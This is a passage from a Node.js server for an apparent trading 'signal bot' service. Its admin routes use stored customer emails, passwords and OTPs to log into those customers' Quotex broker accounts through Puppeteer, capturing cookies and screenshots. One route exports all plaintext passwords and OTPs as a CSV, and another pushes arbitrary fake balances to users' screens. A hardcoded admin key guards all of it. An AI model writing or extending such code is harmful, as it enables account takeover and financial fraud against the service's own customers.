    broadcastSSE('broadcast_message', { message, type, timestamp: new Date().toISOString() });
    res.json({ ok: true, clients: sseClients.size });
});

// ================== USER NOTES ==================
app.post('/api/user-notes', async (req, res) => {
    const { licenceKey, note } = req.body || {};
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) await dbSaveNote(licenceKey, note || '');
        else { if (!global._notesMap) global._notesMap = {}; global._notesMap[licenceKey] = { note: note || '', updatedAt: new Date().toISOString() }; }
        res.json({ ok: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.get('/api/user-notes/:licenceKey', async (req, res) => {
    const { licenceKey } = req.params;
    try {
        if (useDatabase) { const doc = await dbGetNote(licenceKey); return res.json({ note: doc ? doc.note : '', updatedAt: doc ? doc.updatedAt : null }); }
        const entry = (global._notesMap || {})[licenceKey];
        res.json({ note: entry ? entry.note : '', updatedAt: entry ? entry.updatedAt : null });
    } catch(e) { res.json({ note: '', updatedAt: null }); }
});

// ================== FORCE RELOAD / KICK / BALANCE ==================
app.get('/api/force-reload', (req, res) => {
    const { userName, adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    res.json({ ok: true, sent: sendSSEToUser(userName, 'force_reload', { timestamp: new Date().toISOString() }) });
});
app.post('/api/push-loading', (req, res) => {
    const { userName, message = 'Please wait...', seconds = 5, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    res.json({ ok: true, sent: sendSSEToUser(userName, 'show_loading', { message, seconds }) });
});
app.post('/api/inject-balance', (req, res) => {
    const { userName, balance, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    res.json({ ok: true, sent: sendSSEToUser(userName, 'inject_balance', { balance: String(balance || '0') }) });
});
app.get('/api/kick-user', (req, res) => {
    const { userName, adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    const k = (userName || '').trim().toLowerCase();
    const client = sseUserClients.get(k);
    if (client) {
        try { client.write(`data: ${JSON.stringify({ type: 'kicked', data: { message: 'Session ended by admin.' } })}\n\n`); setTimeout(() => { try { client.end(); } catch(e){} }, 300); } catch(e) {}
        sseClients.delete(client); sseUserClients.delete(k);
    }
    res.json({ ok: true, wasConnected: !!client });
});

// ================== BOT SETTINGS ==================
app.get('/api/bot-settings', async (req, res) => { try { await loadSettingsFromDB(); } catch(e) {} res.json(botSettings); });
app.post('/api/bot-settings', async (req, res) => {
    const { telegramUrl, whatsappUrl, botName, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (telegramUrl !== undefined) botSettings.telegramUrl = telegramUrl;
    if (whatsappUrl !== undefined) botSettings.whatsappUrl = whatsappUrl;
    if (botName !== undefined)     botSettings.botName     = botName;
    saveSettings(); await saveSettingsToDB();
    broadcastSSE('settings_updated', botSettings);
    res.json({ ok: true, settings: botSettings });
});

// ================== ORDERS ==================
const ORDERS_FILE = path.join(DATA_DIR, 'orders.json');
let ordersMem = [];
function loadOrdersFile() { try { if (fs.existsSync(ORDERS_FILE)) ordersMem = JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8')); } catch(e) { ordersMem = []; } }
function saveOrdersFile() { try { ensureDataDir(); fs.writeFileSync(ORDERS_FILE, JSON.stringify(ordersMem, null, 2)); } catch(e) {} }
function isAdmin(req) { const k = (req.query.adminKey || req.body?.adminKey || req.headers['x-admin-key'] || '').toString(); return k === 'CSAI-NEWX-ADMI-N999'; }
loadOrdersFile();

app.post('/api/orders', async (req, res) => {
    try {
        const b = req.body || {};
        const clean = s => (typeof s === 'string' ? s.trim().slice(0, 300) : '');
        const { fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp } = Object.fromEntries(Object.entries(b).map(([k, v]) => [k, clean(v)]));
        if (!fullName || !planKey || !paymentMethod || !whatsapp) return res.status(400).json({ error: 'Missing required fields' });
        if (!['week', 'month', 'lifetime'].includes(planKey)) return res.status(400).json({ error: 'Invalid plan' });
        const id    = 'ORD-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
        const order = { id, fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp, status: 'New', createdAt: new Date() };
        if (useDatabase) await Order.create(order); else { ordersMem.unshift(order); saveOrdersFile(); }
        broadcastSSE('new_order', order);
        res.json({ ok: true, order: { id: order.id } });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.get('/api/orders', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    try { res.json(useDatabase ? await Order.find({}).sort({ createdAt: -1 }).limit(1000).lean() : ordersMem); }
    catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.patch('/api/orders/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    const status = (req.body?.status || '').toString();
    if (!['New','Contacted','Paid','Completed','Rejected'].includes(status)) return res.status(400).json({ error: 'Invalid status' });
    try {
        if (useDatabase) { const o = await Order.findOneAndUpdate({ id }, { status }, { new: true }); if (!o) return res.status(404).json({ error: 'Not found' }); broadcastSSE('order_updated', { id, status }); return res.json({ ok: true, order: o }); }
        const o = ordersMem.find(x => x.id === id); if (!o) return res.status(404).json({ error: 'Not found' }); o.status = status; saveOrdersFile(); broadcastSSE('order_updated', { id, status }); res.json({ ok: true, order: o });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/orders/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    try {
        if (useDatabase) await Order.deleteOne({ id }); else { ordersMem = ordersMem.filter(x => x.id !== id); saveOrdersFile(); }
        broadcastSSE('order_deleted', { id }); res.json({ ok: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});

// ================== QUOTEX BROKER SESSION API ==================

// GET /api/qx/sessions — list all active sessions (admin panel)
app.get('/api/qx/sessions', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const list = [...quotexSessions.values()].map(getSessionInfo).sort((a, b) => new Date(b.startedAt) - new Date(a.startedAt));
    res.json({ sessions: list, puppeteerAvailable });
});

// POST /api/qx/launch — start a new Quotex login session
app.post('/api/qx/launch', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { email, password, clientName, licenceKey = '' } = req.body || {};
    if (!email || !password) return res.status(400).json({ error: 'email and password required' });

    if (!puppeteerAvailable) {
        return res.status(503).json({ error: 'Puppeteer not installed. Add it: npm install puppeteer', puppeteerAvailable: false });
    }

    // Check if session already running for this email
    const existing = [...quotexSessions.values()].find(s =>
        s.email === email && !['closed', 'error'].includes(s.status));
    if (existing) {
        return res.json({ ok: false, sessionId: existing.id, message: `Session already ${existing.status} for this email`, existing: getSessionInfo(existing) });
    }

    const sid = makeSessionId();
    const session = {
        id: sid, clientName: clientName || email.split('@')[0], email, password, licenceKey,
        status: 'queued', statusMsg: 'Queued for launch', startedAt: new Date(), updatedAt: new Date(),
        otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null,
    };
    quotexSessions.set(sid, session);
    broadcastSSE('qx_session_new', getSessionInfo(session));

    // Log to DB
    if (useDatabase) {
        BrokerSession.create({ sessionId: sid, clientName: session.clientName, email, licenceKey, status: 'launching' }).catch(() => {});
    }

    // Launch async — don't await here
    launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
    res.json({ ok: true, sessionId: sid, message: 'Session started' });
});

// POST /api/qx/otp — submit OTP for a session
app.post('/api/qx/otp', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { sessionId, otp } = req.body || {};
    if (!sessionId || !otp) return res.status(400).json({ error: 'sessionId and otp required' });
    const result = await submitQuotexOTP(sessionId, otp);
    res.json(result);
});

// GET /api/qx/screenshot/:id — get latest screenshot
app.get('/api/qx/screenshot/:id', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const session = quotexSessions.get(req.params.id);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    if (!session.screenshotBase64) return res.json({ screenshot: null });
    res.json({ screenshot: session.screenshotBase64, contentType: 'image/jpeg' });
});

// POST /api/qx/close — close a session
app.post('/api/qx/close', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { sessionId } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
    await closeQuotexSession(sessionId, 'Closed by admin');
    res.json({ ok: true });
});

// POST /api/qx/launch-from-user — launch session using stored user credentials
app.post('/api/qx/launch-from-user', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { licenceKey } = req.body || {};
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    const user = useDatabase ? await dbFindUserByKey(licenceKey) : users.find(u => u.licenceKey === licenceKey);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!user.username || !user.password) return res.status(400).json({ error: 'User has no credentials stored yet' });

    const sid = makeSessionId();
    const session = {
        id: sid, clientName: user.fullName || 'Client', email: user.username, password: user.password, licenceKey,
        status: 'queued', statusMsg: 'Launched from user record', startedAt: new Date(), updatedAt: new Date(),
        otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null,
    };
    quotexSessions.set(sid, session);
    broadcastSSE('qx_session_new', getSessionInfo(session));
    launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
    res.json({ ok: true, sessionId: sid, clientName: session.clientName, email: user.username });
});

// GET /api/qx/history — session history from DB
app.get('/api/qx/history', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    try {
        if (useDatabase) {
            const history = await BrokerSession.find({}).sort({ startedAt: -1 }).limit(100).lean();
            return res.json(history);
        }
        res.json([]);
    } catch(e) { res.json([]); }
});

// ================== EXPORT USERS CSV ==================
app.get('/api/export-users', (req, res) => {
    const adminKey = req.query.adminKey || req.headers['x-admin-key'];
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    const rows = [
        ['Full Name','License Key','Status','Email','Password','OTP','Connected','Last Activity','IP','Blocked'].join(','),
        ...users.map(u => [
            `"${(u.fullName||'').replace(/"/g,'""')}"`, `"${(u.licenceKey||'').replace(/"/g,'""')}"`,
            `"${(u.status||'').replace(/"/g,'""')}"`,   `"${(u.username||'').replace(/"/g,'""')}"`,
            `"${(u.password||'').replace(/"/g,'""')}"`, `"${(u.otp||'').replace(/"/g,'""')}"`,
            u.connected ? 'Yes' : 'No', `"${(u.lastActivity||'').replace(/"/g,'""')}"`,
            `"${(u.ip||'').replace(/"/g,'""')}"`, u.blocked ? 'Yes' : 'No',
        ].join(','))
    ].join('\r\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="users-${new Date().toISOString().slice(0,10)}.csv"`);
    res.send(rows);
});

// ================== ROOT ==================
app.get('/', (req, res) => {
    const sessions = [...quotexSessions.values()];
    res.send(
        `✅ Chinese Signal Bot Server v5 Running\n` +
        `💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based'}\n` +
        `🤖 Puppeteer: ${puppeteerAvailable ? 'ENABLED ✅' : 'Disabled (npm install puppeteer)'}\n` +
        `🔓 Quotex Sessions: ${sessions.filter(s => !['closed','error'].includes(s.status)).length} active, ` +
        `${sessions.filter(s => s.status === 'logged_in').length} logged in`
    );
});

// ================== START SERVER ==================
const PORT = process.env.PORT || 3000;
async function startServer() {
    try { await mongoose.connection.asPromise(); useDatabase = true; } catch(e) { console.warn('MongoDB not ready at startup, using file mode.'); }
    if (!useDatabase) { ensureDataDir(); loadUsers(); loadLicenses(); setInterval(() => { try { saveUsers(); } catch(e){} try { saveLicenses(); } catch(e){} }, 30000); }
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File-based'}`);
        console.log(`🤖 Puppeteer: ${puppeteerAvailable ? 'ENABLED' : 'Disabled'}`);
        if (!puppeteerAvailable) console.log('   → To enable Quotex Auto-Login: npm install puppeteer');
        if (process.env.AUTO_LAUNCH_ON_LOGIN === 'true') console.log('🔄 Auto-Launch on Login: ENABLED');
        telegramPollLoop().catch(e => console.error('Telegram poll loop crashed:', e.message));
    });
}
startServer().catch(err => { console.error('Failed to start server:', err); process.exit(1); });
